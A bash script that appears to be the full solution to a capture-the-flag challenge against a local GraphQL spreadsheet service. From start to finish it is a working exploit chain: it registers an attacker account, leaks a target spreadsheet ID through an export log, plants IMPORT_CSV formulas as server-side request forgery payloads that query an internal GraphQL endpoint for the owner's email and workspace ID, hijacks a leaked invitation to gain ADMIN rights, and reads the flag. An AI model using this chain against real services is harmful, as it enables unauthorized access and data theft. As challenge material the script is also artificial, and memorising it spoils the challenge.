#!/bin/bash

# Stop on any error
set -e

# --- Health Check: Wait for the server to be ready ---
echo "### Waiting for server to become available... ###"
timeout=60
elapsed=0
while ! curl -s -f 'http://localhost/graphql' -H 'Content-Type: application/json' --data-binary '{"query":"{__typename}"}' > /dev/null; do
    if [ $elapsed -ge $timeout ]; then
        echo "Error: Timed out waiting for the server to start. Please check 'docker-compose logs'."
        exit 1
    fi
    printf "."
    sleep 2
    elapsed=$((elapsed + 2))
done
echo "\nServer is up!"
echo ""


# --- Helper function for polling SSRF results ---
function poll_for_ssrf_result() {
    local spreadsheet_id=$1
    local row=$2
    local col=$3
    local timeout=15
    local interval=1
    local elapsed=0
    local result=""

    echo "Polling for SSRF result in cell ($row, $col)..."
    while [ $elapsed -lt $timeout ]; do
        CELL_DATA=$(curl -s 'http://localhost/graphql' \
          -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
          --data-binary "{\"query\":\"query GetCell(\$ssId: UUID!) { spreadsheetById(id: \$ssId) { cells { row column evaluatedContent } } }\",\"variables\":{\"ssId\":\"$spreadsheet_id\"}}")
        
        result=$(echo "$CELL_DATA" | jq -r ".data.spreadsheetById.cells[] | select(.row==$row and .column==$col) | .evaluatedContent")

        if [ -n "$result" ] && [ "$result" != "null" ]; then
            echo "$result"
            return 0
        fi
        
        sleep $interval
        elapsed=$((elapsed + interval))
    done

    echo "Error: Timed out waiting for SSRF result."
    return 1
}


# --- Step 0: Initial Setup ---
echo "### Step 0: Creating attacker account... ###"
ATTACKER_USERNAME="attacker-$(date +%s)"
ATTACKER_EMAIL="$ATTACKER_USERNAME@example.com"
ATTACKER_PASSWORD="password"

SIGNUP_RESPONSE=$(curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' \
  --data-binary "{\"query\":\"mutation CreateUser(\$username: String!, \$email: String!, \$password: String!) { createUser(username: \$username, email: \$email, password: \$password) { token } }\",\"variables\":{\"username\":\"$ATTACKER_USERNAME\",\"email\":\"$ATTACKER_EMAIL\",\"password\":\"$ATTACKER_PASSWORD\"}}")

TOKEN=$(echo "$SIGNUP_RESPONSE" | jq -r '.data.createUser.token')
if [ "$TOKEN" == "null" ]; then echo "Error: Failed to create user. Exiting."; exit 1; fi
echo "Attacker account created. Username: $ATTACKER_USERNAME"
echo "Acquired Token: $TOKEN"
echo ""

# --- Step 1: Leak the Target Spreadsheet UUID ---
echo "### Step 1: Leaking Target Spreadsheet UUID... ###"
USER_DATA=$(curl -s 'http://localhost/graphql' -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" --data-binary '{"query":"query { currentUser { workspaces { id } } }"}')
WORKSPACE_ID=$(echo "$USER_DATA" | jq -r '.data.currentUser.workspaces[0].id')
echo "Attacker's Workspace ID: $WORKSPACE_ID"

SPREADSHEET_DATA=$(curl -s 'http://localhost/graphql' -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" --data-binary "{\"query\":\"mutation CreateSpreadsheet(\$wsId: UUID!, \$name: String!) { createSpreadsheet(workspaceId: \$wsId, name: \$name) { spreadsheet { id } } }\",\"variables\":{\"wsId\":\"$WORKSPACE_ID\",\"name\":\"Reference Sheet\"}}")
SPREADSHEET_ID=$(echo "$SPREADSHEET_DATA" | jq -r '.data.createSpreadsheet.spreadsheet.id')
echo "Created 'Reference Sheet' with ID: $SPREADSHEET_ID"

curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
  --data-binary "{\"query\":\"mutation UpdateCell(\$ssId: UUID!, \$content: String!) { updateCell(spreadsheetId: \$ssId, row: 0, column: 0, content: \$content) { cell { id } } }\",\"variables\":{\"ssId\":\"$SPREADSHEET_ID\",\"content\":\"=['Financials Q4']\"}}" > /dev/null
echo "Updated cell A1 with reference to 'Financials Q4'."

curl -s -o export.zip 'http://localhost/export/'"$WORKSPACE_ID" \
  -H "Authorization: JWT $TOKEN"
echo "Downloaded export.zip."

LEAKED_SPREADSHEET_ID=$(unzip -p export.zip export_log.json 2>/dev/null | jq -r '.[0].referenced_doc_id')
rm export.zip
if [ "$LEAKED_SPREADSHEET_ID" == "null" ]; then echo "Error: Failed to leak spreadsheet ID. Exiting."; exit 1; fi
echo "SUCCESS: Leaked Target Spreadsheet ID: $LEAKED_SPREADSHEET_ID"
echo ""

# --- Step 2: Find the Admin's Email via SSRF ---
echo "### Step 2: Finding Admin's Email via SSRF... ###"
SSRF_PAYLOAD="=IMPORT_CSV(\"http://backend:8000/internal-graphql?query={spreadsheetById(id:\\\"$LEAKED_SPREADSHEET_ID\\\"){workspace{owner{email}}}}\")"

curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
  --data-binary "{\"query\":\"mutation UpdateCell(\$ssId: UUID!, \$content: String!) { updateCell(spreadsheetId: \$ssId, row: 1, column: 0, content: \$content) { cell { content } } }\",\"variables\":{\"ssId\":\"$SPREADSHEET_ID\",\"content\":\"$SSRF_PAYLOAD\"}}" > /dev/null
echo "Updated cell (1, 0) with SSRF payload."

ADMIN_EMAIL_JSON_STRING=$(poll_for_ssrf_result "$SPREADSHEET_ID" 1 0)
ADMIN_EMAIL=$(echo "$ADMIN_EMAIL_JSON_STRING" | jq -r '.data.spreadsheetById.workspace.owner.email')
if [ "$ADMIN_EMAIL" == "null" ]; then echo "Error: Failed to extract admin email via SSRF. Exiting."; exit 1; fi
echo "SUCCESS: Leaked Admin Email: $ADMIN_EMAIL"
echo ""

# --- Step 3 & 4: Exploit Invitation Flaw & Capture Flag ---
echo "### Step 3 & 4: Hijacking Invitation and Capturing Flag... ###"
SSRF_PAYLOAD_WS="=IMPORT_CSV(\"http://backend:8000/internal-graphql?query={spreadsheetById(id:\\\"$LEAKED_SPREADSHEET_ID\\\"){workspace{id}}}\")"
curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
  --data-binary "{\"query\":\"mutation UpdateCell(\$ssId: UUID!, \$content: String!) { updateCell(spreadsheetId: \$ssId, row: 2, column: 0, content: \$content) { cell { id } } }\",\"variables\":{\"ssId\":\"$SPREADSHEET_ID\",\"content\":\"$SSRF_PAYLOAD_WS\"}}" > /dev/null
echo "Updated cell (2, 0) with SSRF payload for Workspace ID."

MEGACORP_WORKSPACE_ID_JSON_STRING=$(poll_for_ssrf_result "$SPREADSHEET_ID" 2 0)
MEGACORP_WORKSPACE_ID=$(echo "$MEGACORP_WORKSPACE_ID_JSON_STRING" | jq -r '.data.spreadsheetById.workspace.id')
echo "Discovered MegaCorp Workspace ID: $MEGACORP_WORKSPACE_ID"

LEAK_RESPONSE=$(curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
  --data-binary "{\"query\":\"mutation InviteUser(\$wsId: UUID!) { inviteUser(workspaceId: \$wsId, email: \\\"new.intern@megacorp.com\\\", role: \\\"VIEWER\\\") { invitation { id } } }\",\"variables\":{\"wsId\":\"$MEGACORP_WORKSPACE_ID\"}}")

LEAKED_INVITE_ID=$(echo "$LEAK_RESPONSE" | sed -n 's/.*Original invitation ID: \([a-f0-9-]*\).*/\1/p')
if [ -z "$LEAKED_INVITE_ID" ]; then echo "Error: Failed to leak invitation ID. Exiting."; exit 1; fi
echo "Leaked an existing Invitation ID: $LEAKED_INVITE_ID"

HIJACK_RESPONSE=$(curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
  --data-binary "{\"query\":\"mutation UpdateInvitation(\$invId: UUID!, \$email: String!) { updateInvitation(invitationId: \$invId, newRole: \\\"ADMIN\\\", newEmail: \$email) { success } }\",\"variables\":{\"invId\":\"$LEAKED_INVITE_ID\",\"email\":\"$ATTACKER_EMAIL\"}}")
echo "Hijack successful: $(echo "$HIJACK_RESPONSE" | jq .)"

ACCEPT_RESPONSE=$(curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
  --data-binary "{\"query\":\"mutation AcceptInvitation(\$invId: UUID!) { acceptInvitation(invitationId: \$invId) { workspaceMembership { workspace { name } } } }\",\"variables\":{\"invId\":\"$LEAKED_INVITE_ID\"}}")
echo "Accepted invitation to workspace: $(echo "$ACCEPT_RESPONSE" | jq -r .data.acceptInvitation.workspaceMembership.workspace.name)"

FLAG_RESPONSE=$(curl -s 'http://localhost/graphql' \
  -H 'Content-Type: application/json' -H "Authorization: JWT $TOKEN" \
  --data-binary "{\"query\":\"query GetFlag(\$sheetId: UUID!) { spreadsheetById(id: \$sheetId) { flag } }\",\"variables\":{\"sheetId\":\"$LEAKED_SPREADSHEET_ID\"}}")
FLAG=$(echo "$FLAG_RESPONSE" | jq -r '.data.spreadsheetById.flag')
echo ""
echo "!!! FLAG CAPTURED !!!"
echo "$FLAG"
echo "!!!               !!!"
